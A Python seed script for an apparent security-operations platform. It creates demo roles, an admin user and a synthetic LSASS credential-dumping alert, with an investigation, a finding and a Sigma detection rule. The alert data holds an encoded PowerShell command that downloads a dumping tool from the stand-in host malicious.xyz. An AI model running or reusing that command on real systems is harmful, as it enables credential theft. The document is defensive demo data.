"""Database seed and demo data initialization."""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone
import structlog
from sqlalchemy import select
from socforge.auth.security import hash_password
from socforge.config import get_settings
from socforge.database import AsyncSessionLocal
from socforge.models.user import Role, User
from socforge.models.alert import Alert, AlertSeverity, AlertStatus, Entity, EntityRelationship, EntityType, RelationshipType, Event
from socforge.models.investigation import Investigation, InvestigationAlert, Finding, FindingConfidence
from socforge.models.detection import Detection, DetectionVersion, RuleLanguage, ValidationState
from socforge.models.operations import Workspace

logger = structlog.get_logger(__name__)


async def seed_data():
    from socforge.database import Base, engine
    import socforge.models  # noqa: F401

    settings = get_settings()

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with AsyncSessionLocal() as db:
        # 0. Seed Default Workspace
        default_workspace = (await db.execute(select(Workspace).where(Workspace.slug == "default"))).scalar_one_or_none()
        if not default_workspace:
            default_workspace = Workspace(
                name="Default SOC Operations",
                slug="default",
                description="Primary workspace for SOC operations, detection engineering, and threat response.",
                is_active=True,
            )
            db.add(default_workspace)
            await db.flush()
            logger.info("created_default_workspace", slug="default")

        # 1. Seed Roles
        roles = [
            ("Administrator", "Full system and platform administration access"),
            ("Incident Commander", "Lead incident response and authorize containment actions"),
            ("Detection Engineer", "Create, test, validate, and manage detection rules"),
            ("SOC Analyst", "Triage alerts, conduct investigations, log findings"),
            ("Viewer", "Read-only visibility for compliance and executive auditing"),
        ]

        role_objs = {}
        for name, desc in roles:
            existing = (await db.execute(select(Role).where(Role.name == name))).scalar_one_or_none()
            if not existing:
                r = Role(name=name, description=desc)
                db.add(r)
                await db.flush()
                role_objs[name] = r
            else:
                role_objs[name] = existing

        # 2. Seed Default Admin User
        admin_email = settings.first_admin_email
        admin_pass = settings.first_admin_password
        admin_user = (await db.execute(select(User).where(User.email == admin_email))).scalar_one_or_none()
        if not admin_user:
            admin_user = User(
                email=admin_email,
                full_name="Sandeep Mothukuri",
                hashed_password=hash_password(admin_pass),
                role_id=role_objs["Administrator"].id,
                is_active=True,
                is_superuser=True,
            )
            db.add(admin_user)
            await db.flush()
            logger.info("created_admin_user", email=admin_email)


        # 3. Seed Synthetic Security Telemetry & Alert
        existing_alert = (await db.execute(select(Alert).where(Alert.external_id == "DEMO-ALERT-001"))).scalar_one_or_none()
        if not existing_alert:
            alert = Alert(
                external_id="DEMO-ALERT-001",
                source="wazuh",
                title="Potential Credential Dumping via LSASS Process Access",
                description="Mimikatz-like memory read pattern detected targeting lsass.exe process on domain controller.",
                severity=AlertSeverity.critical,
                status=AlertStatus.investigating,
                risk_score=92.5,
                source_ip="192.168.1.105",
                destination_ip="10.0.0.10",
                source_host="WKSTN-FIN-04",
                destination_host="DC-PRIMARY-01",
                username="svc_backup",
                process_name="powershell.exe",
                process_command_line="powershell.exe -enc SQBYAE0AIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHgAeQB6AC8AcAByAG8AYwBkAHUAbQBwAC4AZQB4AGUA...",
                file_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                domain="malicious.xyz",
                mitre_techniques=["T1003.001", "T1059.001"],
                mitre_tactics=["Credential Access", "Execution"],
                raw_event={
                    "event_id": 10,
                    "provider": "Microsoft-Windows-Sysmon",
                    "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1010",
                },
            )
            db.add(alert)
            await db.flush()

            # Create entities for evidence graph
            user_ent = Entity(entity_type=EntityType.user, value="svc_backup", display_name="svc_backup (Service Account)", risk_score=85.0)
            host_ent = Entity(entity_type=EntityType.host, value="DC-PRIMARY-01", display_name="DC-PRIMARY-01 (Domain Controller)", risk_score=90.0)
            proc_ent = Entity(entity_type=EntityType.process, value="powershell.exe", display_name="powershell.exe (PID 4912)", risk_score=75.0)
            ip_ent = Entity(entity_type=EntityType.ip_address, value="192.168.1.105", display_name="192.168.1.105", risk_score=60.0)
            dom_ent = Entity(entity_type=EntityType.domain, value="malicious.xyz", display_name="malicious.xyz (Staging C2)", risk_score=95.0, is_malicious=True)
            tech_ent = Entity(entity_type=EntityType.technique, value="T1003.001", display_name="T1003.001: LSASS Memory Dump", risk_score=90.0)

            for e in [user_ent, host_ent, proc_ent, ip_ent, dom_ent, tech_ent]:
                db.add(e)
            await db.flush()

            # Create Investigation
            inv = Investigation(
                title="Investigation: LSASS Memory Dumping on DC-PRIMARY-01",
                description="Investigating suspicious PowerShell invoking LSASS access with unusual rights from backup account.",
                severity="critical",
                risk_score=94.0,
                assigned_to_id=admin_user.id,
                created_by_id=admin_user.id,
                mitre_techniques=["T1003.001", "T1059.001"],
                mitre_tactics=["Credential Access"],
            )
            db.add(inv)
            await db.flush()

            db.add(InvestigationAlert(investigation_id=inv.id, alert_id=alert.id))

            # Connect graph relationships
            r1 = EntityRelationship(
                source_entity_id=user_ent.id,
                target_entity_id=host_ent.id,
                relationship_type=RelationshipType.user_authenticated_to_host,
                investigation_id=inv.id,
            )
            r2 = EntityRelationship(
                source_entity_id=proc_ent.id,
                target_entity_id=host_ent.id,
                relationship_type=RelationshipType.process_ran_on_host,
                investigation_id=inv.id,
            )
            r3 = EntityRelationship(
                source_entity_id=host_ent.id,
                target_entity_id=dom_ent.id,
                relationship_type=RelationshipType.host_connected_to_domain,
                investigation_id=inv.id,
            )
            r4 = EntityRelationship(
                source_entity_id=proc_ent.id,
                target_entity_id=tech_ent.id,
                relationship_type=RelationshipType.finding_maps_to_technique,
                investigation_id=inv.id,
            )
            for r in [r1, r2, r3, r4]:
                db.add(r)

            # Add finding
            finding = Finding(
                investigation_id=inv.id,
                created_by_id=admin_user.id,
                title="LSASS Memory Access Pattern Confirmed via Sysmon Event 10",
                description="Service account svc_backup was leveraged to execute encoded PowerShell and request handle access to LSASS process memory.",
                confidence=FindingConfidence.confirmed,
                mitre_techniques=["T1003.001"],
                mitre_tactics=["Credential Access"],
                response_recommendations=["Isolate host DC-PRIMARY-01 temporarily from non-essential traffic", "Rotate password and Kerberos keys for svc_backup"],
                has_detection_hypothesis=True,
            )
            db.add(finding)
            await db.flush()

            # Detection rule candidate
            sigma_content = """title: LSASS Process Access by Unusual Account
id: 5b4c1e48-831e-45fd-993d-3a5f4585c4bf
status: stable
description: Detects unusual access to LSASS memory from processes running as service accounts
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains: '0x1010'
    condition: selection
falsepositives:
    - Legitimate backup utilities with administrative privilege
level: high
tags:
    - attack.credential_access
    - attack.t1003.001
"""
            det = Detection(
                name="LSASS Process Memory Dumping Detection",
                description="Detects anomalous process access handles to LSASS memory",
                rule_language=RuleLanguage.sigma,
                rule_content=sigma_content,
                finding_id=finding.id,
                mitre_techniques=["T1003.001"],
                validation_state=ValidationState.approved,
                author_id=admin_user.id,
            )
            db.add(det)
            await db.flush()
            db.add(DetectionVersion(detection_id=det.id, version=1, rule_language=RuleLanguage.sigma, rule_content=sigma_content, change_summary="Approved candidate"))

        await db.commit()
        logger.info("seed_data_completed")


if __name__ == "__main__":
    asyncio.run(seed_data())
